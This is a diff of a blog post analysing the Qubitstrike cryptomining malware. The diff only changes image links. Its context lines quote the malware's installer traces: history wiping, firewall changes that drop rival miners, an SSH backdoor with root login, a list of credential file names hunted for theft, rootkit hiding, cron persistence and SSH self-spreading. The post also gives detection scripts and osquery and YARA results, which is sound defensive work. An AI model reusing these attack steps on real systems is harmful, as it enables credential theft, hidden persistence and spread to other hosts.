@@ -35,7 +35,7 @@
     <p>Published on October 20, 2023</p>
   </div>
   <p>Earlier this week, I stumbled into <a href="https://www.cadosecurity.com/qubitstrike-an-emerging-malware-campaign-targeting-jupyter-notebooks/">Cado's report on Qubitstrike</a>, an attack on publicly accessible <a href="https://jupyter.org/">Jupyter notebook</a> installations. Unlike most security reports, the hosted malware files were still available, which meant I could analyze and validate our defenses against it. Normally, I don't get this opportunity to study emerging threats, as I'm not paying the $20,000/yr paywall fee for access to Google's VirusTotal service that most researchers seem to rely on.</p>
-<p><img src="https://i.snap.as/KuU2dMIe.webp" alt=""></p>
+<p><img src="KuU2dMIe.webp" alt=""></p>
 <!--more-->
 <p>I really like QubitStrike: it has a bit of everything and is easy to dissect. The most exciting thing about it is that it's the first example I've seen of casual attackers employing a kernel rootkit that actually works on the latest versions of popular Linux distributions. Let's take a tour!</p>
 <h2>The Qubitstrike Installer</h2>
@@ -69,7 +69,7 @@ RSA=&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv
 <li>SSH keys</li>
 </ul>
 <h3>Fetch Tools</h3>
-<p><img src="https://i.snap.as/jsHYhB4p.png" alt=""></p>
+<p><img src="jsHYhB4p.png" alt=""></p>
 <p>I'm now going to show the installer output in <a href="https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_02_03.html">debug mode (using <code>bash -x)</code></a>, as it usually makes the behavior easier to discern. If you are on a Linux distro that has &quot;apt&quot;, &quot;yum&quot;, or &quot;apk&quot; package manager available, the script will install curl or wget for you:</p>
 <pre><code class="language-shell">---------------------------------------
  INSTALLING WGET, CURL ...
@@ -141,7 +141,7 @@ curl is already the newest version (7.88.1-8ubuntu2.3).
 <p>Then, it begins disabling the shell command history. First, by hiding all commands that begin with a with a &quot; &quot; character:</p>
 <pre><code class="language-shell">+ HISTCONTROL=ignorespace
 </code></pre>
-<p><img src="https://i.snap.as/qkVrmeCD.jpg" alt=""></p>
+<p><img src="qkVrmeCD.jpg" alt=""></p>
 <p>HISTCONTROL=ignorespace is an entirely new feature to me (<a href="https://unix.stackexchange.com/questions/115934/why-does-bash-have-a-histcontrol-ignorespace-option">why does it even exist?</a>). The script then disables the history file altogether via a variety of mechanisms, making that setting useless anyways.</p>
 <pre><code>+ export HISTFILE=/dev/null
 + unset HISTFILE
@@ -164,7 +164,7 @@ curl is already the newest version (7.88.1-8ubuntu2.3).
 grep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf;
 </code></pre>
 <h3>Squeezing out the competition</h3>
-<p><img src="https://i.snap.as/kSYk4Avb.webp" alt=""></p>
+<p><img src="kSYk4Avb.webp" alt=""></p>
 <p>The firewall rules are reprogrammed to drop packets to and from competing miners:</p>
 <pre><code class="language-shell">    iptables -A OUTPUT -p tcp --dport 3333 -j DROP &gt; /dev/null 2&gt;&amp;1
     iptables -A OUTPUT -p tcp --dport 5555 -j DROP &gt; /dev/null 2&gt;&amp;1
@@ -232,7 +232,7 @@ vm.nr_hugepages = 128
 <p>Unsurprisingly, the program is <a href="https://xmrig.com/"><code>XMRig</code></a> - the most popular option for invasive cryptocurrency miners. It's disappointing that the archive only contains an x86_64 binary, but the installer script never checks for the machine architecture. The attacker may have done that step manually within <a href="https://jupyter.org/">Jupyter</a>. It was a nice touch that the script author limited the CPU usage to 90% to avoid detection.</p>
 <h2>Installing the backdoor</h2>
 <p>Rather than implementing its own detectable backdoor, QubitStrike makes the wise decision to use <a href="https://www.openssh.com/">OpenSSH</a>, which is already likely on the system. This works nicely since we already know from the attack profile that the machine is on the Internet, and we've already flushed the firewall that may have prevented external SSH access.</p>
-<p><img src="https://i.snap.as/l4InqXJW.jpg" alt=""></p>
+<p><img src="l4InqXJW.jpg" alt=""></p>
 <p>The attacker plugs in their SSH credentials (likely from a <a href="https://www.kali.org/">Kali Linux</a> machine), disables the <a href="https://en.wikipedia.org/wiki/TCP_Wrappers">tcpwrapper</a> controls, reconfigures sshd to allow remote root login, and starts it up. I'm not sure what the &quot;Port 78&quot; reference is all about, but I assume they are disabling a backdoor configuration from a competing crypto miner.</p>
 <pre><code class="language-shell">---------------------------------------
  SSH setup  
@@ -252,7 +252,7 @@ vm.nr_hugepages = 128
 + systemctl restart ssh||service ssh restart||/etc/init.d/ssh restart||/etc/init.d/sshd restart||/etc/rc.d/sshd restart||service sshd restart||scw-fetch-ssh-keys --upgrade
 </code></pre>
 <h3>Phoning home</h3>
-<p><img src="https://i.snap.as/7P7847lO.jpg" alt=""></p>
+<p><img src="7P7847lO.jpg" alt=""></p>
 <p>Qubitstrike collects some information about the health of the miner and the backdoor and then sends it to a <a href="https://telegram.org/">Telegram</a> channel:</p>
 <pre><code class="language-shell">+ service ssh status
 + '[' 0 -eq 0 ']'
@@ -268,7 +268,7 @@ root        4088  192  0.1  42216  4768 ?        Ssl  18:24   0:02 /usr/share/.L
 </code></pre>
 <h3>Credential Theft</h3>
 <p>The most disappointing part of the script is how it steals and sends credentials. Their approach is exceptionally slow: It crawls the filesystem separately for each credential type rather than using the find commands native support for finding multiple names. I blame the fin<a href="https://man7.org/linux/man-pages/man1/find.1.html">d command's bizarre syntax and poorly written documentation</a>, as it took me a couple of attempts to get it correct myself.</p>
-<p><img src="https://i.snap.as/7Z1S4bxi.png" alt=""></p>
+<p><img src="7Z1S4bxi.png" alt=""></p>
 <pre><code class="language-shell">+ CRED_FILE_NAMES=(&quot;credentials&quot; &quot;cloud&quot; &quot;.s3cfg&quot; &quot;.passwd-s3fs&quot; &quot;authinfo2&quot; &quot;.s3backer_passwd&quot; &quot;.s3b_config&quot; &quot;s3proxy.conf&quot; &quot;access_tokens.db&quot; &quot;credentials.db&quot; &quot;.smbclient.conf&quot; &quot;.smbcredentials&quot; &quot;.samba_credentials&quot; &quot;.pgpass&quot; &quot;secrets&quot; &quot;.boto&quot; &quot;.netrc&quot; &quot;.git-credentials&quot; &quot;api_key&quot; &quot;censys.cfg&quot; &quot;ngrok.yml&quot; &quot;filezilla.xml&quot; &quot;recentservers.xml&quot; &quot;queue.sqlite3&quot; &quot;servlist.conf&quot; &quot;accounts.xml&quot; &quot;azure.json&quot; &quot;kube-env&quot;)
 + for CREFILE in ${CRED_FILE_NAMES[@]}
 + find / -maxdepth 23 -type f -name credentials
@@ -288,7 +288,7 @@ root        4088  192  0.1  42216  4768 ?        Ssl  18:24   0:02 /usr/share/.L
 </code></pre>
 <p>Safety reminder: never mount your personal home directory to your malware VMs, as the find command would have traversed filesystems to discover and upload your credentials.</p>
 <h2>The kernel-level rootkit: Diamorphine</h2>
-<p><img src="https://i.snap.as/8SIolL5k.png" alt=""></p>
+<p><img src="8SIolL5k.png" alt=""></p>
 <p>Here's where Qubitstrike gets interesting. This is the first time I've seen a casual miner with a Linux rootkit that works on a modern Ubuntu release:</p>
 <pre><code class="language-shell">---------------------------------------
  Begin hiding 
@@ -350,7 +350,7 @@ give_root(void) {
 <p>This malware intercepts userland requests to glibc's <a href="https://linux.die.net/man/3/readdir"><code>readdir(3)</code></a> function. If the name matches <code>python-dev</code>, the process is hidden in much the same way as Diamorphine. In the old days, user-mode rootkits were deployed by setting the <a href="https://www.hpc.dtu.dk/?page_id=1180"><code>LD_LIBRARY_PATH</code></a><code> environment variable</code>, but on Linux, you can get the same result by adding the library path to <code>/etc/ld.so.preload</code>.</p>
 <p>In 99% of environments, this file shouldn't exist. Check for it.</p>
 <h2>Establishing Persistence</h2>
-<p><img src="https://i.snap.as/aArwlOKd.webp" alt=""></p>
+<p><img src="aArwlOKd.webp" alt=""></p>
 <p>QubitStrike will establish persistence through cron. First, it grabs the killer script, which shares the same competition killers we saw before, from Codeberg, and installs it to cron:</p>
 <pre><code class="language-shell">+ cron_set
 + killerd=/usr/share/.28810
@@ -373,7 +373,7 @@ give_root(void) {
 + chattr -R +i /usr/share/.LQvKibDTq4
 </code></pre>
 <h2>The viral component of QubitStrike</h2>
-<p><img src="https://i.snap.as/CV7Rixe9.png" alt=""></p>
+<p><img src="CV7Rixe9.png" alt=""></p>
 <p>One of the surprising features of QubitStrike is that it will attempt to replicate itself to any systems it finds in <code>/root/.ssh/known_hosts</code>:</p>
 <pre><code class="language-shell">ssh_local() {
 if [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then
@@ -391,7 +391,7 @@ fi
 </code></pre>
 <p>It does not do anything about truncating systemd logs, though.</p>
 <h2>Detecting Qubitstrike from a shell</h2>
-<p><img src="https://i.snap.as/KVms6GJG.png" alt=""></p>
+<p><img src="KVms6GJG.png" alt=""></p>
 <p>On Linux, process hiders are hilariously simple to detect. In my experience, ro rootkits bother to hide all of the /proc lookup points, preferring instead to just hide from the /proc directory list.</p>
 <p>My detection technique is to iterate over all possible process ID numbers and check for the existence of /proc/$pid/something file. If it exists, cross-reference it against the directory listing of /proc, and report missing entries. This works swimmingly:</p>
 <pre><code class="language-shell">#!/bin/bash
@@ -456,7 +456,7 @@ NOTE: root-escalation detection requires a non-root user
 <p>It's also easy to detect the SSH keys, hidden directories, and crontab entries - if you want to see how, check out the <a href="https://github.com/tstromberg/sunlight">tstromberg/sunlight</a> repo.</p>
 <h2>Detecting Qubitstrike with osquery</h2>
 <p>Some of you might know that I also maintain the <a href="https://github.com/chainguard-dev/osquery-defense-kit">osquery-defense-kit</a> project, something I've put together in my time at <a href="https://chainguard.dev/">Chainguard</a>. It's a collection of production-quality queries to uncover suspicious behavior using <a href="https://www.osquery.io/">osquery</a>.</p>
-<p><img src="https://i.snap.as/ttv2DxWz.png" alt=""></p>
+<p><img src="ttv2DxWz.png" alt=""></p>
 <p><code>osquery-defense-toolkit</code> has a handy <code>make detect</code> target to run all the scripts. Here's what pops up on a machine with Qubitstrike:</p>
 <pre><code>pid-hidden-by-rootkit (1 rows)
 ------------------------------
@@ -505,7 +505,7 @@ force_loaded:0 force_unloaded:0 is_aux:0 is_unsigned:8192 kernel_warning:0 modul
 </ul>
 <p>These queries were written way before QubitStrike ever existed; they just happen to cover a broad set of malicious behavior. It's nice when old tricks still work on new dogs.</p>
 <h2>Detecting Qubitstrike with YARA</h2>
-<p><img src="https://i.snap.as/9grhf7eX.png" alt=""></p>
+<p><img src="9grhf7eX.png" alt=""></p>
 <p>The original article by Cado had a very specific rule for the QubitStrike installer. Still, it's worth mentioning that generic malware detection rules that predate QubitStrike are equally as good at detecting not just the QubitStrike, but also the files it installs: Using a set of general-purpose YARA rules I plan to open-source, the QubitStrike installer triggered a record 22 different rules:</p>
 <pre><code class="language-log">CRITICAL /Users/t/src/malware-menagerie/linux/2023.Trojan_Miner.QubitStrike/installer/mi.sh
   * router_malware
